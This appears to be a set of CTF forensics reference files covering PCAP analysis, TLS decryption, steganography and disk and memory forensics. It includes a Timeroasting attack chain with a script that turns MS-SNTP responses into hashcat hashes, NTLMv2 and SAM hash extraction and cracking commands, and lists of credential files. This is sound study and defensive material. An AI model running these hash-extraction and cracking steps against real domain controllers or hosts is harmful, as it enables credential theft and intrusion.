**Pattern (UntilTime):** After enumerating valid machine account RIDs via RID recycling, the attacker sends NTP requests with those RIDs to extract HMAC-MD5 authentication material from the domain controller's MS-SNTP responses.

**Background:** Microsoft's MS-SNTP extends standard NTP with Netlogon authentication in Active Directory environments. The client places a domain RID in the NTP `Key Identifier` field (4 bytes, little-endian). The domain controller responds with an HMAC-MD5 signature derived from the machine account's NTLM hash — leaking crackable authentication material.

**Wireshark extraction:**
```bash
# Filter NTP traffic from attacker
tshark -r capture.pcapng -Y "ntp && ip.src == 10.16.13.13" -T fields -e udp.payload
```

**Convert Key Identifier to RID:**
```bash
# NTP Key Identifier is 4 bytes, little-endian
echo "<key_id_hex>" | sed 's/\(..\)/\1 /g' | awk '{print "0x"$4$3$2$1}' | xargs printf "%d\n"
```

**NTP response payload structure (68 bytes):**

| Offset | Length | Field |
|--------|--------|-------|
| 0-47 | 48 | Salt (NTP header + extensions) |
| 48-51 | 4 | Key Identifier (RID, little-endian) |
| 52-67 | 16 | HMAC-MD5 crypto-checksum |

**Hash reconstruction for Hashcat (mode 31300):**
```python
import sys
from struct import unpack

def to_hashcat_form(hex_payload):
    data = bytes.fromhex(hex_payload.strip())
    salt = data[:48]
    rid = unpack('<I', data[-20:-16])[0]
    md5hash = data[-16:]
    return f"{rid}:$sntp-ms${md5hash.hex()}${salt.hex()}"

if len(sys.argv) != 2:
    print("Usage: python sntp_to_hashcat.py <hex_payload>")
    sys.exit(1)

print(to_hashcat_form(sys.argv[1]))
```

**Cracking with Hashcat:**
```bash
# Mode 31300 = MS-SNTP (Timeroasting)
hashcat -m 31300 -a 0 -O hashes.txt rockyou.txt --username
```

**Example hash format:**
```text
1108:$sntp-ms$d7d0422d66705c6189c1d20aed76baa4$1c0111e900000000000a09314c4f434ced4c979d652b89f1e1b8428bffbfcd0aed4ca3bbb1338716ed4ca3bbb133cf3a
```

**Key insight:** MS-SNTP responses from domain controllers leak HMAC-MD5 authentication material tied to machine account NTLM hashes. Unlike Kerberoasting (which targets service accounts), Timeroasting targets **machine accounts** whose passwords are often weak or predictable (e.g., lowercase hostname). Any valid RID triggers a response — no special privileges required beyond network access to the DC's NTP service (UDP 123).

**Full attack chain:**
1. Authenticate to SMB as Guest
2. Enumerate valid RIDs via LSARPC RID recycling
3. Send MS-SNTP requests with discovered RIDs
4. Extract HMAC-MD5 hashes from NTP responses
5. Crack offline with Hashcat mode 31300

---

See also: [network.md](network.md) for basic network forensics techniques (tcpdump, TLS/SSL decryption, Wireshark, port scanning, SMB3 decryption, credential extraction, 5G protocols).

---

## UA-Gated C2 URL-Path Hex-XOR Exfil (source: idekCTF 2025)

**Trigger:** PCAP where only requests with a specific User-Agent (`my-python-requests-useragent` / custom string) receive non-default responses; URL paths look hex-encoded.
**Signals:** tshark filter `http.user_agent == "..."` isolates exactly the attacker flow; path segments are `[0-9a-f]{16,}`.
**Mechanic:** C2 pattern — UA as auth, URL-path as data channel. Pipeline:
1. `tshark -r cap.pcap -Y 'http.user_agent contains "my-python"' -T fields -e http.request.full_uri`
2. URL-decode then hex-decode each path
3. XOR against a password retrieved from a *separate* UA-gated endpoint (often returns the key once as the first response)
Automation: one-liner Python scanner included in `foreniq.sh` for custom-UA flows.



---

<!-- Source: network.md -->

# CTF Forensics - Network

## Table of Contents
- [tcpdump Quick Reference](#tcpdump-quick-reference)
- [TLS/SSL Decryption via Keylog File](#tlsssl-decryption-via-keylog-file)
- [Wireshark Basics](#wireshark-basics)
- [Port Scan Analysis](#port-scan-analysis)
- [Gateway/Device via MAC OUI](#gatewaydevice-via-mac-oui)
- [WordPress Reconnaissance](#wordpress-reconnaissance)
- [Post-Exploitation Traffic](#post-exploitation-traffic)
- [Credential Extraction](#credential-extraction)
- [SMB3 Encrypted Traffic](#smb3-encrypted-traffic)
- [5G/NR Protocol Analysis](#5gnr-protocol-analysis)
- [Email Headers](#email-headers)
- [USB HID Stenography/Chord PCAP (UTCTF 2024)](#usb-hid-stenographychord-pcap-utctf-2024)
- [BCD Encoding in UDP (VuwCTF 2025)](#bcd-encoding-in-udp-vuwctf-2025)
- [HTTP File Upload Exfiltration in PCAP (MetaCTF 2026)](#http-file-upload-exfiltration-in-pcap-metactf-2026)
- [TLS Master Key Extraction from Coredump (PlaidCTF 2014)](#tls-master-key-extraction-from-coredump-plaidctf-2014)
- [Split Archive Reassembly from HTTP Transfers (ASIS CTF Finals 2013)](#split-archive-reassembly-from-http-transfers-asis-ctf-finals-2013)

---

## tcpdump Quick Reference

Command-line packet capture tool for quick network forensics triage.

```bash
# Basic capture on interface
sudo tcpdump -i eth0

# Capture to file
sudo tcpdump -i eth0 -w capture.pcap

# Filter by source IP
sudo tcpdump -i eth0 src 192.168.1.100

# Filter by destination port
sudo tcpdump -i eth0 dst port 80

# Combined filter with file output
sudo tcpdump -i eth0 -w packets.pcap 'src 172.22.206.250 and port 443'

# Read from file with verbose output
tcpdump -r capture.pcap -v

# Show packet contents in ASCII
tcpdump -r capture.pcap -A

# Show hex + ASCII dump
tcpdump -r capture.pcap -X

# Count total packets
tcpdump -r capture.pcap -q | wc -l
```

**Common filters:**
| Filter | Description |
|--------|-------------|
| `host 10.0.0.1` | Traffic to/from IP |
| `net 192.168.1.0/24` | Entire subnet |
| `port 80` | HTTP traffic |
| `tcp` / `udp` / `icmp` | Protocol filter |
| `src host X and dst port Y` | Combined |

**Key insight:** Use tcpdump for quick command-line triage when Wireshark is unavailable. Pipe to `strings` or `grep` for fast flag hunting: `tcpdump -r capture.pcap -A | grep -i flag`.

---

## TLS/SSL Decryption via Keylog File

To decrypt TLS traffic in Wireshark, provide either the pre-master secret or a keylog file.

**Method 1 — SSLKEYLOGFILE (client-side key logging):**

If the challenge provides a keylog file (or you can set `SSLKEYLOGFILE`):
```bash
# Set environment variable before running the client
export SSLKEYLOGFILE=/tmp/sslkeys.log
curl https://target/secret

# Import into Wireshark:
# Edit → Preferences → Protocols → TLS → (Pre)-Master-Secret log filename → /tmp/sslkeys.log
```

**Keylog file format (NSS Key Log Format):**
```text
CLIENT_RANDOM <32_bytes_client_random_hex> <48_bytes_master_secret_hex>
```

**Method 2 — RSA private key (if server key is known):**

**Note:** Only works with RSA key exchange. Sessions using forward secrecy (ECDHE/DHE cipher suites) cannot be decrypted with the server's private key — use Method 1 instead. CTF challenges with weak RSA keys typically use RSA key exchange.

```bash
# Wireshark: Edit → Preferences → Protocols → TLS → RSA keys list
# IP: 127.0.0.1, Port: 443, Protocol: http, Key File: server.key

# Or via tshark:
tshark -r capture.pcap -o "tls.keys_list:127.0.0.1,443,http,server.key" -Y http
```

**Method 3 — Weak RSA key factoring (see also linux-forensics.md):**
```bash
# Extract certificate from PCAP
tshark -r capture.pcap -Y "tls.handshake.type==11" -T fields -e tls.handshake.certificate | head -1

# Factor weak modulus, generate private key with rsatool
python rsatool.py -p <p> -q <q> -e 65537 -o server.key

# Import key into Wireshark
```

**SSL handshake components needed for decryption:**
1. `client_random` — sent in ClientHello
2. `server_random` — sent in ServerHello
3. Pre-master secret (PMS) — encrypted in ClientKeyExchange with server's RSA public key

**Key insight:** Look for keylog files (`.log`, `sslkeys.txt`) in challenge artifacts. If the challenge gives you a private key, use it directly. For weak RSA keys in certificates, factor the modulus to derive the private key.

---

## Wireshark Basics

```bash
# Filters
http.request.method == "POST"
tcp.stream eq 5
frame contains "flag"

# Export files
File → Export Objects → HTTP

# tshark
tshark -r capture.pcap -Y "http" -T fields -e http.file_data
tshark -r capture.pcap --export-objects http,/tmp/http_objects
```

---

## Port Scan Analysis

```bash
# IP conversation statistics
tshark -r capture.pcap -q -z conv,ip

# Find open ports (SYN-ACK responses)
tshark -r capture.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==1" \
  -T fields -e ip.src -e tcp.srcport | sort -u
```

---

## Gateway/Device via MAC OUI

```bash
# Extract MAC addresses
tshark -r capture.pcap -Y "arp" -T fields \
  -e arp.src.hw_mac -e arp.src.proto_ipv4 | sort -u

# Vendor lookup
curl -s "https://macvendors.com/query/88:bd:09"
```

---

## WordPress Reconnaissance

**Identify WPScan:**
```bash
tshark -r capture.pcap -Y "http.user_agent contains \"WPScan\"" | head -1
```

**WordPress version:**
```bash
cat /tmp/http_objects/feed* | grep -i generator
```

**Plugins:**
```bash
tshark -r capture.pcap \
  -Y "http.response.code == 200 && http.request.uri contains \"wp-content/plugins\"" \
  -T fields -e http.request.uri | sort -u
```

**Usernames (REST API):**
```bash
cat /tmp/http_objects/*per_page* | jq '.[].name'
```

---

## Post-Exploitation Traffic

**Step 1: TCP conversations**
```bash
tshark -r capture.pcap -q -z conv,tcp
```

**Step 2: Established connections (SYN-ACK)**
```bash
tshark -r capture.pcap -Y "tcp.flags.syn == 1 and tcp.flags.ack == 1" \
  -T fields -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport | sort -u
```

**Step 3: Follow TCP stream**
```bash
tshark -r capture.pcap -q -z "follow,tcp,ascii,<stream_number>"
```

**Reverse shell indicators:**
- `bash: cannot set terminal process group`
- `bash: no job control in this shell`
- Shell prompts like `www-data@hostname:/path$`

---

## Credential Extraction

**High-value files:**
| Application | File | Format |
|-------------|------|--------|
| WordPress | `wp-config.php` | `define('DB_PASSWORD', '...')` |
| Laravel | `.env` | `DB_PASSWORD=` |
| MySQL | `/etc/mysql/debian.cnf` | `password = ` |

```bash
# Search shell stream for credentials
tshark -r capture.pcap -q -z "follow,tcp,ascii,<stream>" | grep -i "password"
```

---

## SMB3 Encrypted Traffic

**Step 1: Extract NTLMv2 hash**
```bash
tshark -r capture.pcap -Y "ntlmssp.messagetype == 0x00000003" -T fields \
  -e ntlmssp.ntlmv2_response.ntproofstr \
  -e ntlmssp.auth.username
```

**Step 2: Crack with hashcat**
```bash
hashcat -m 5600 ntlmv2_hash.txt wordlist.txt
```

**Step 3: Derive SMB 3.1.1 session keys (Python)**
```python
from Cryptodome.Cipher import AES, ARC4
from Cryptodome.Hash import MD4
import hmac, hashlib

def SP800_108_Counter_KDF(Ki, Label, Context, L):
    n = (L // 256) + 1
    result = b''
    for i in range(1, n + 1):
        data = i.to_bytes(4, 'big') + Label + b'\x00' + Context + L.to_bytes(4, 'big')
        result += hmac.new(Ki, data, hashlib.sha256).digest()
    return result[:L // 8]

# Compute session key
nt_hash = MD4.new(password.encode('utf-16le')).digest()
response_key = hmac.new(nt_hash, (user.upper() + domain.upper()).encode('utf-16le'), hashlib.md5).digest()
key_exchange_key = hmac.new(response_key, ntproofstr, hashlib.md5).digest()
session_key = ARC4.new(key_exchange_key).encrypt(encrypted_session_key)

# Derive encryption keys
c2s_key = SP800_108_Counter_KDF(session_key, b"SMBC2SCipherKey\x00", preauth_hash, 128)
s2c_key = SP800_108_Counter_KDF(session_key, b"SMBS2CCipherKey\x00", preauth_hash, 128)
```

**Step 4: Decrypt (AES-128-GCM)**
```python
def decrypt_smb311(transform_data, key):
    signature = transform_data[4:20]
    nonce = transform_data[20:32]
    aad = transform_data[20:52]
    encrypted = transform_data[52:]

    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    cipher.update(aad)
    return cipher.decrypt_and_verify(encrypted, signature)
```

---

## 5G/NR Protocol Analysis

**Wireshark setup:**
- Enable: NAS-5GS, RLC-NR, PDCP-NR, MAC-NR

**SMS in 5G (3GPP TS 23.040):**

| IEI | Format |
|-----|--------|
| 0x0c | iMelody (ringtone) |
| 0x0e | Large Animation (16×16) |
| 0x18 | WVG (vector graphics) |

**iMelody to Morse:**
- Notes like `c4c4c4r2` encode dots/dashes

---

## Email Headers

- Check routing information
- Look for encoded attachments (base64)
- MIME boundaries may hide data

---

## USB HID Stenography/Chord PCAP (UTCTF 2024)

**Pattern (Gibberish):** USB keyboard PCAP with simultaneous multi-key presses = stenography chording.

**Detection:** Multiple simultaneous USB HID keys (6+ at once) in interrupt transfers. Not regular typing.

**Decoding workflow:**
1. Extract HID reports from PCAP
2. Detect simultaneous key states (multiple keycodes in same report)
3. Map chords to Plover stenography dictionary
4. Install Plover, use its dictionary for translation

```bash
# Extract USB HID data
tshark -r capture.pcap -Y "usb.transfer_type == 1" -T fields -e usb.capdata
```

---

## BCD Encoding in UDP (VuwCTF 2025)

**Pattern (1.5x-engineer):** "1.5x" hints at the encoding ratio.

**BCD (Binary-Coded Decimal):** Each nibble (4 bits) encodes one decimal digit (0-9). Two digits per byte vs one ASCII digit per byte → BCD is 2x denser than ASCII decimal. The "1.5x" name refers to the challenge-specific framing: 3 BCD bytes encode 6 digits which represent 2 ASCII bytes (3:2 ratio).

**Decoding:**
```python
def bcd_decode(data):
    result = ''
    for byte in data:
        high = (byte >> 4) & 0x0F
        low = byte & 0x0F
        result += f'{high}{low}'
    return result

# UDP sessions differentiated by first byte
# Session 1 = BCD-encoded ASCII metadata with flag
# Session 2 = encrypted DOCX
```

**Lesson:** Challenge name often hints at encoding ratio or technique.

---

## HTTP File Upload Exfiltration in PCAP (MetaCTF 2026)

**Pattern (Dead Drop):** Small PCAP with TCP streams containing HTTP traffic. Exfiltrated data uploaded as a file via multipart form POST.

**Quick triage:**
```bash
# Count packets and protocols
tshark -r capture.pcap -q -z io,phs

# List HTTP requests
tshark -r capture.pcap -Y "http.request" -T fields -e http.request.method -e http.request.uri -e http.host

# Export all HTTP objects (files transferred)
tshark -r capture.pcap --export-objects http,/tmp/http_objects
ls -la /tmp/http_objects/

# Follow specific TCP streams
tshark -r capture.pcap -q -z "follow,tcp,ascii,0"
tshark -r capture.pcap -q -z "follow,tcp,ascii,1"
```

**Extraction workflow:**
1. Export HTTP objects — uploaded files are extracted automatically
2. Check for multipart form-data POST requests (file uploads)
3. Look for unusual User-Agent strings (e.g., `DeadDropBot/1.0`) indicating automated exfiltration
4. Extracted files may be images (PNG/JPEG) with flag text rendered visually — open and inspect

**Key indicators of exfiltration:**
- POST to `/upload` endpoints
- Non-standard User-Agent strings
- Small number of packets but containing file transfers
- "Dead drop" pattern: attacker uploads file to web server for later retrieval

**Lesson:** Always start with `--export-objects` to extract transferred files before deep packet analysis. The flag is often in the exfiltrated file itself.

---

## TLS Master Key Extraction from Coredump (PlaidCTF 2014)

**Pattern:** Given a PCAP with HTTPS traffic and a coredump from the server/client process, extract the TLS master key from OpenSSL's in-memory session structure to decrypt the traffic.

**Extraction workflow:**

1. Find the TLS Session ID from the handshake in Wireshark (visible in plaintext in the ClientHello/ServerHello)
2. Search the coredump for the session ID bytes:
```bash
# Search for session ID in coredump
grep -c '\x19\xAB\x5E\xDC\x02\xF0\x97\xD5' corefile
hexdump -C corefile | grep --before=5 '19 ab 5e dc'
```

3. In OpenSSL's `ssl_session_st`, `master_key[48]` is stored immediately before `session_id[32]`. Read the 48 bytes before the session ID match.

4. Create a Wireshark pre-master-secret log file:
```text
RSA Session-ID:<hex_session_id> Master-Key:<hex_master_key>
```

5. Load in Wireshark: Edit → Preferences → Protocols → TLS → (Pre-)Master-Secret log filename

**Key insight:** OpenSSL stores `master_key[48]` directly before `session_id[32]` in `ssl_session_st`. Search the coredump for the session ID (from the TLS handshake), then read the 48 bytes before it. This works with coredumps, memory dumps, and Volatility memory extractions.

---

## Split Archive Reassembly from HTTP Transfers (ASIS CTF Finals 2013)

**Pattern:** PCAP contains multiple HTTP file transfers with MD5-hash filenames, all the same size except one smaller file. Files are fragments of a split archive (e.g., 7z) that must be reassembled in order. A separate TCP stream contains a chat conversation with the archive password.

**Identification:**
- Multiple HTTP-transferred files with uniform size (e.g., 61440 bytes) and one smaller trailing fragment
- First file has an archive magic number (e.g., `7z` header `37 7A BC AF 27 1C`)
- Cover traffic and multiple ports used to obscure the transfers
- Apache directory listing in PCAP provides file modification timestamps

**Reassembly workflow:**

1. Extract all HTTP objects and identify fragments:
```bash
# Export HTTP objects
tshark -r capture.pcap --export-objects http,/tmp/http_objects
ls -la /tmp/http_objects/

# Check first file for archive magic number
xxd /tmp/http_objects/d33cf9e6230f3b8e5a0c91a0514ab476 | head -1
# 00000000: 377a bcaf 271c ...  → 7z archive header
```

2. Determine fragment order from Apache directory listing timestamps in PCAP:
```bash
# Extract the directory listing page
tshark -r capture.pcap -Y "http.response and http.content_type contains html" \
  -T fields -e http.file_data | head -1
# Parse modification timestamps from the HTML table, sort chronologically
```

3. Concatenate fragments in timestamp order:
```bash
# Order files by modification timestamp (earliest first, smallest file last)
cat d33cf9e6230f3b8e5a0c91a0514ab476 \
    57f18f111f47eb9f7b5cdf5bd45144b0 \
    1e13be50f05092e2a4e79b321c8450d4 \
    ... \
    c68cc0718b8b85e62c8a671f7c81e80a > archive.7z
```

4. Extract password from TCP conversation stream:
```bash
# Follow TCP streams to find chat with key exchange
tshark -r capture.pcap -q -z "follow,tcp,ascii,0"
# Look for "secret key" / "part N" messages, concatenate all parts
```

5. Decompress with recovered password:
```bash
7z x archive.7z -p"M)m5s6S^[>@#Q3+10PD.KE#cyPsvqH"
```

**Key insight:** When PCAP contains many same-sized file transfers, suspect a split archive. The fragment order is not the download order — look for an Apache/nginx directory listing page in the PCAP whose modification timestamps provide the correct reassembly sequence. The smallest file is the trailing fragment.

---

See also: [network-advanced.md](network-advanced.md) for advanced network forensics techniques (packet interval timing encoding, USB HID mouse/pen drawing recovery, NTLMv2 hash cracking, TCP flag covert channels, DNS steganography, multi-layer PCAP with XOR, Brotli decompression bomb seam analysis, SMB RID recycling, Timeroasting MS-SNTP).



---

<!-- Source: quickref.md -->

# ctf-forensics — Quick Reference

Inline code snippets and quick-reference tables. Loaded on demand from `SKILL.md`. All detailed techniques live in the category-specific support files listed in `SKILL.md#additional-resources`.

## Quick Start Commands

```bash
# File analysis
file suspicious_file
exiftool suspicious_file     # Metadata
binwalk suspicious_file      # Embedded files
strings -n 8 suspicious_file
hexdump -C suspicious_file | head  # Check magic bytes

# Disk forensics
sudo mount -o loop,ro image.dd /mnt/evidence
fls -r image.dd              # List files
photorec image.dd            # Carve deleted files

# Memory forensics (Volatility 3)
vol3 -f memory.dmp windows.info
vol3 -f memory.dmp windows.pslist
vol3 -f memory.dmp windows.filescan
```

See [disk-and-memory.md](disk-and-memory.md) for full Volatility plugin reference, VM forensics, and coredump analysis.

## Log Analysis

```bash
grep -iE "(flag|part|piece|fragment)" server.log     # Flag fragments
grep "FLAGPART" server.log | sed 's/.*FLAGPART: //' | uniq | tr -d '\n'  # Reconstruct
sort logfile.log | uniq -c | sort -rn | head         # Find anomalies
```

See [linux-forensics.md](linux-forensics.md) for Linux attack chain analysis and Docker image forensics.

## Windows Event Logs (.evtx)

**Key Event IDs:**
- 1001 - Bugcheck/reboot
- 1102 - Audit log cleared
- 4720 - User account created
- 4781 - Account renamed

**RDP Session IDs (TerminalServices-LocalSessionManager):**
- 21 - Session logon succeeded
- 24 - Session disconnected
- 1149 - RDP auth succeeded (RemoteConnectionManager, has source IP)

```python
import Evtx.Evtx as evtx
with evtx.Evtx("Security.evtx") as log:
    for record in log.records():
        print(record.xml())
```

See [windows.md](windows.md) for full event ID tables, registry analysis, SAM parsing, USN journal, and anti-forensics detection.

## When Logs Are Cleared

If attacker cleared event logs, use these alternative sources:
1. **USN Journal ($J)** - File operations timeline (MFT ref, timestamps, reasons)
2. **SAM registry** - Account creation from key last_modified timestamps
3. **PowerShell history** - ConsoleHost_history.txt (USN DATA_EXTEND = command timing)
4. **Defender MPLog** - Separate log with threat detections and ASR events
5. **Prefetch** - Program execution evidence
6. **User profile creation** - First login time (profile dir in USN journal)

See [windows.md](windows.md) for detailed parsing code and anti-forensics detection checklist.

## Steganography

```bash
steghide extract -sf image.jpg
zsteg image.png              # PNG/BMP analysis
stegsolve                    # Visual analysis
```

- **Binary border stego:** Black/white pixels in 1px image border encode bits clockwise
- **FFT frequency domain:** Image data hidden in 2D FFT magnitude spectrum; try `np.fft.fft2` visualization
- **DTMF audio:** Phone tones encoding data; decode with `multimon-ng -a DTMF`
- **Multi-layer PDF:** Check hidden comments, post-EOF data, XOR with keywords, ROT18 final layer
- **SSTV + LSB:** SSTV signal may be red herring; check 2-bit LSB of audio samples with `stegolsb`
- **SVG keyframes:** Animation `keyTimes`/`values` attributes encode binary/Morse via fill color alternation
- **PNG chunk reorder:** Fix chunk order: IHDR → ancillary → IDAT (in order) → IEND
- **File overlays:** Check after IEND for appended archives with overwritten magic bytes

- **Custom freq DTMF:** Non-standard dual-tone frequencies; generate spectrogram first (`ffmpeg -i audio -lavfi showspectrumpic`), map custom grid to keypad digits, decode variable-length ASCII
- **JPEG DQT LSB:** Unused quantization tables (ID 2, 3) carry LSB-encoded data; access via `Image.open().quantization` and extract bit 0 from each of 64 values
- **Multi-track audio subtraction:** Two nearly-identical audio tracks in MKV/video; `sox -m a0.wav "|sox a1.wav -p vol -1" diff.wav` cancels shared content, flag appears in spectrogram of difference signal (5-12 kHz band)
- **Packet interval timing:** Identical packets with two distinct interval values (e.g., 10ms/100ms) encode binary; filter by interface, compute inter-packet deltas, threshold to bits

See [steganography.md](steganography.md) and [stego-advanced.md](stego-advanced.md) for full code examples and decoding workflows.

## PDF Analysis

```bash
exiftool document.pdf        # Metadata (often hides flags!)
pdftotext document.pdf -     # Extract text
strings document.pdf | grep -i flag
binwalk document.pdf         # Embedded files
```

**Advanced PDF stego (Nullcon 2026 rdctd):** Six techniques -- invisible text separators, URI annotations with escaped braces, Wiener deconvolution on blurred images, vector rectangle QR codes, compressed object streams (`mutool clean -d`), document metadata fields.

See [steganography.md](steganography.md) for full PDF steganography techniques and code.

## Disk / VM / Memory Forensics

```bash
# Disk images
sudo mount -o loop,ro image.dd /mnt/evidence
fls -r image.dd && photorec image.dd

# VM images (OVA/VMDK)
tar -xvf machine.ova
7z x disk.vmdk -oextracted "Windows/System32/config/SAM" -r

# Memory (Volatility 3)
vol3 -f memory.dmp windows.pslist
vol3 -f memory.dmp windows.cmdline
vol3 -f memory.dmp windows.netscan
vol3 -f memory.dmp windows.dumpfiles --physaddr <addr>

# String carving
strings -a -n 6 memdump.bin | grep -E "FLAG|SSH_CLIENT|SESSION_KEY"

# Coredump
gdb -c core.dump  # info registers, x/100x $rsp, find "flag"
```

See [disk-and-memory.md](disk-and-memory.md) for full Volatility plugin reference, VM forensics, VMware snapshots, deleted partition recovery, ZFS forensics, and ransomware analysis.

## Windows Password Hashes

```bash
# Extract with impacket, crack with hashcat -m 1000
python -c "from impacket.examples.secretsdump import *; SAMHashes('SAM', LocalOperations('SYSTEM').getBootKey()).dump()"
```

See [windows.md](windows.md) for SAM details and [network-advanced.md](network-advanced.md) for NTLMv2 cracking from PCAP.

## Bitcoin Tracing

- Use mempool.space API: `https://mempool.space/api/tx/<TXID>`
- **Peel chain:** ALWAYS follow LARGER output; round amounts indicate peels

## Uncommon File Magic Bytes

| Magic | Format | Extension | Notes |
|-------|--------|-----------|-------|
| `OggS` | Ogg container | `.ogg` | Audio/video |
| `RIFF` | RIFF container | `.wav`,`.avi` | Check subformat |
| `%PDF` | PDF | `.pdf` | Check metadata & embedded objects |
| `GCDE` | PrusaSlicer binary G-code | `.g`, `.bgcode` | See 3d-printing.md |

## Common Flag Locations

- PDF metadata fields (Author, Title, Keywords)
- Image EXIF data
- Deleted files (Recycle Bin `$R` files)
- Registry values
- Browser history
- Log file fragments
- Memory strings

## WMI Persistence Analysis

**Pattern (Backchimney):** Malware uses WMI event subscriptions for persistence (MITRE T1546.003).

```bash
python PyWMIPersistenceFinder.py OBJECTS.DATA
```

- Look for FilterToConsumerBindings with CommandLineEventConsumer
- Base64-encoded PowerShell in consumer commands
- Event filters triggered on system events (logon, timer)

See [windows.md](windows.md) for WMI repository analysis details.

## Network Forensics Quick Reference

- **TFTP netascii:** Binary transfers corrupted; fix with `data.replace(b'\r\n', b'\n').replace(b'\r\x00', b'\r')`
- **TLS keylog decryption:** Import SSLKEYLOGFILE or RSA private key into Wireshark (Edit → Preferences → Protocols → TLS)
- **TLS weak RSA:** Extract cert, factor modulus, generate private key with `rsatool`, add to Wireshark
- **USB audio:** Extract isochronous data with `tshark -e usb.iso.data`, import as raw PCM in Audacity
- **NTLMv2 from PCAP:** Extract server challenge + NTProofStr + blob from NTLMSSP_AUTH, brute-force

See [network.md](network.md) for SMB3 decryption, credential extraction, and [linux-forensics.md](linux-forensics.md) for full TLS/TFTP/USB workflows.

## Browser Forensics

- **Chrome/Edge:** Decrypt `Login Data` SQLite with AES-GCM using DPAPI master key
- **Firefox:** Query `places.sqlite` -- `SELECT url FROM moz_places WHERE url LIKE '%flag%'`

See [linux-forensics.md](linux-forensics.md) for full browser credential decryption code.

## Additional Technique Quick References

- **Docker image forensics:** Config JSON preserves ALL `RUN` commands even after cleanup. `tar xf app.tar` then inspect config blob. See [linux-forensics.md](linux-forensics.md).
- **Linux attack chains:** Check `auth.log`, `.bash_history`, recent binaries, PCAP. See [linux-forensics.md](linux-forensics.md).
- **RAID 5 XOR recovery:** Two disks of a 3-disk RAID 5 → XOR byte-by-byte to recover the third: `bytes(a ^ b for a, b in zip(disk1, disk3))`. See [disk-and-memory.md](disk-and-memory.md#raid-5-disk-recovery-via-xor-crypto-cat).
- **PowerShell ransomware:** Extract scripts from minidump, find AES key, decrypt SMTP attachment. See [disk-and-memory.md](disk-and-memory.md).
- **Linux ransomware + memory dump:** If Volatility is unreliable, recover AES key via raw-memory candidate scanning and magic-byte validation; re-extract zip cleanly to avoid missing files/false negatives. See [disk-and-memory.md](disk-and-memory.md).
- **Deleted partitions:** `testdisk` or `kpartx -av`. See [disk-and-memory.md](disk-and-memory.md).
- **ZFS forensics:** Reconstruct labels, Fletcher4 checksums, PBKDF2 cracking. See [disk-and-memory.md](disk-and-memory.md).
- **Hardware signals:** VGA/HDMI TMDS/DisplayPort, Voyager audio, Saleae UART decode, Flipper Zero. See [signals-and-hardware.md](signals-and-hardware.md).
- **USB HID mouse drawing:** Render relative HID movements per draw mode as bitmap; separate modes, skip pen lifts, scale 5-8x. See [network-advanced.md](network-advanced.md).
- **Side-channel power analysis:** Multi-dimensional power traces (positions × guesses × traces × samples). Average across traces, find sample with max variance, select guess with max power at leak point. See [signals-and-hardware.md](signals-and-hardware.md).
- **Packet interval timing:** Binary data encoded as inter-packet delays in PCAP. Two interval values = two bit values. See [network-advanced.md](network-advanced.md).
- **BMP bitplane QR:** Extract bitplanes 0-2 per RGB channel with NumPy; hidden QR often in bit 1 (not bit 0). See [steganography.md](steganography.md).
- **Image puzzle reassembly:** Edge-match pixel differences between piece borders, greedy placement in grid. See [steganography.md](steganography.md).
- **Audio FFT notes:** Dominant frequencies → musical note names (A-G) spell words. See [stego-advanced.md](stego-advanced.md).
- **Audio metadata octal:** Exiftool comment with underscore-separated octal numbers → decode to ASCII/base64. See [stego-advanced.md](stego-advanced.md).
- **G-code visualization:** Side projections (XZ/YZ) reveal text. See [3d-printing.md](3d-printing.md).
- **Git directory recovery:** `gitdumper.sh` for exposed `.git` dirs. See [linux-forensics.md](linux-forensics.md).
- **KeePass v4 cracking:** Standard `keepass2john` lacks v4/Argon2 support; use `ivanmrsulja/keepass2john` fork or `keepass4brute`. Generate wordlists with `cewl`. See [linux-forensics.md](linux-forensics.md).
- **Cross-channel multi-bit LSB:** Different bit positions per RGB channel (R[0], G[1], B[2]) encode hidden data. See [stego-advanced.md](stego-advanced.md).
- **F5 JPEG DCT detection:** Ratio of ±1 to ±2 AC coefficients drops from ~3:1 to ~1:1 with F5; sparse images need secondary ±2/±3 metric. See [steganography.md](steganography.md).
- **PNG unused palette stego:** Unused PLTE entries (not referenced by pixels) carry hidden data in red channel values. See [steganography.md](steganography.md).
- **Keyboard acoustic side-channel:** MFCC features from keystroke audio + KNN classification against labeled reference. 10ms window captures impact transient. See [signals-and-hardware.md](signals-and-hardware.md).
- **TCP flag covert channel:** 6 TCP flag bits (FIN/SYN/RST/PSH/ACK/URG) = values 0-63, encoding base64 characters. Nonsensical flag combos on a consistent dest port = covert data. See [network-advanced.md](network-advanced.md).
- **Brotli decompression bomb seam:** Compressed bomb has repeating blocks; flag breaks the pattern at a seam. Compare adjacent blocks to find discontinuity, decompress only that region. See [network-advanced.md](network-advanced.md).
- **Git reflog/fsck squash recovery:** `git rebase --squash` leaves orphaned objects recoverable via `git fsck --unreachable --no-reflogs`. See [linux-forensics.md](linux-forensics.md).
- **DNS trailing byte binary:** Extra bytes (`0x30`/`0x31`) appended after DNS question structure encode binary bits; 8-bit MSB-first chunks → ASCII. See [network-advanced.md](network-advanced.md).
- **Fake TLS + mDNS key + printability merge:** TCP stream disguised as TLS hides ZIP; XOR key from mDNS TXT record; merge two decrypted arrays by selecting printable characters. See [network-advanced.md](network-advanced.md).
- **Seed-based pixel permutation stego:** Deterministic pixel shuffle (Fisher-Yates with known seed) + multi-bitplane interleaved LSB extraction from Y channel → hidden QR code. See [steganography.md](steganography.md).
- **SMB RID recycling:** Guest auth + LSARPC `LsaLookupSids` with incrementing RIDs enumerates AD accounts from PCAP. See [network-advanced.md](network-advanced.md#smb-rid-recycling-via-lsarpc-midnight-2026).
- **Timeroasting (MS-SNTP):** NTP requests with machine RIDs extract HMAC-MD5 hashes from DC; crack with hashcat -m 31300. See [network-advanced.md](network-advanced.md#timeroasting--ms-sntp-hash-extraction-midnight-2026).
- **Android forensics:** Extract APK with `adb pull`, analyze with `apktool`, check `shared_prefs/` and SQLite databases in `/data/data/<package>/`. See [disk-and-memory.md](disk-and-memory.md#android-forensics).
- **Docker container forensics:** `docker save` exports layered tars; deleted files persist in earlier layers. `docker history --no-trunc` reveals build secrets. See [disk-and-memory.md](disk-and-memory.md#container-forensics-docker).
- **Cloud storage forensics:** S3/GCP/Azure versioning preserves deleted objects. `list-object-versions` recovers deleted flags. See [disk-and-memory.md](disk-and-memory.md#cloud-storage-forensics-aws-s3--gcp--azure).
